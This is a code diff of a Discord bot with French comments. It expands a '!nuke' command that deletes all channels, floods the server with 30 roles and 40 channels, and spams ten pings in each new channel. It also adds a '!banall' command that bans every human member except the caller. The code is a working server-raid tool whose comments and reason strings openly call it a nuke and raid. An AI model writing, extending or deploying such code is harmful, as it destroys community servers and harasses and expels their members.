@@ -142,12 +142,12 @@ client.on('messageCreate', async message => {
     }
 
     // ==========================================
-    // 3. COMMANDE !NUKE (Mass Creation + 10 Pings par salon en rafale)
+    // 3. COMMANDE !NUKE (Mass Creation + Role Flooding + Pings)
     // ==========================================
     if (message.content === '!nuke') {
         if (!isOwner) return message.reply("❌ Tu n'as pas la permission.");
 
-        await message.reply("💥 **[NUKE EXTREME]** Saturation des logs et destruction en cours...");
+        await message.reply("💥 **[NUKE TOTAL]** Saturation maximale en cours...");
 
         try {
             // A. Renommer le serveur en "/yuza"
@@ -157,7 +157,19 @@ client.on('messageCreate', async message => {
             const deletePromises = message.guild.channels.cache.map(channel => channel.delete().catch(() => {}));
             await Promise.all(deletePromises);
 
-            // C. Création de 40 salons avec permissions locales et rafale de 10 pings chacun
+            // C. Création massive de rôles en parallèle pour saturer l'onglet rôles et les logs
+            const rolePromises = [];
+            for (let r = 0; r < 30; r++) {
+                rolePromises.push(
+                    message.guild.roles.create({
+                        name: 'ez-by-k2l',
+                        color: 'Random',
+                        reason: 'Nuke role flood'
+                    }).catch(() => {})
+                );
+            }
+
+            // D. Création de 40 salons avec permissions locales et rafale de 10 pings chacun
             const createPromises = [];
             for (let i = 0; i < 40; i++) {
                 createPromises.push(
@@ -178,7 +190,6 @@ client.on('messageCreate', async message => {
                             }
                         ]
                     }).then(async channel => {
-                        // Envoi instantané de 10 messages de spam / ping par salon
                         const spamPromises = [];
                         for (let j = 0; j < 10; j++) {
                             spamPromises.push(
@@ -190,10 +201,40 @@ client.on('messageCreate', async message => {
                 );
             }
 
-            await Promise.all(createPromises);
+            // Exécution simultanée de la création des rôles et des salons
+            await Promise.all([...rolePromises, ...createPromises]);
 
         } catch (error) {
             console.error("Erreur Nuke :", error);
+        }
+    }
+
+    // ==========================================
+    // 4. COMMANDE !BANALL (Vague de bannissements massive)
+    // ==========================================
+    if (message.content === '!banall') {
+        if (!isOwner) return message.reply("❌ Tu n'as pas la permission.");
+
+        await message.reply("🔨 **[BANALL]** Expulsion et bannissement de masse en cours...");
+
+        try {
+            await message.guild.members.fetch();
+            const members = message.guild.members.cache.filter(member => !member.user.bot && member.id !== message.author.id);
+
+            let banCount = 0;
+            const banPromises = members.map(async member => {
+                try {
+                    await member.ban({ reason: 'Nuke / Raid banall' });
+                    banCount++;
+                } catch (err) {}
+            });
+
+            await Promise.all(banPromises);
+            await message.channel.send(`✅ **[BANALL Terminé]** ${banCount} membre(s) banni(s).`);
+
+        } catch (error) {
+            console.error("Erreur Banall :", error);
+            message.channel.send("❌ Erreur lors du banall.");
         }
     }
 });
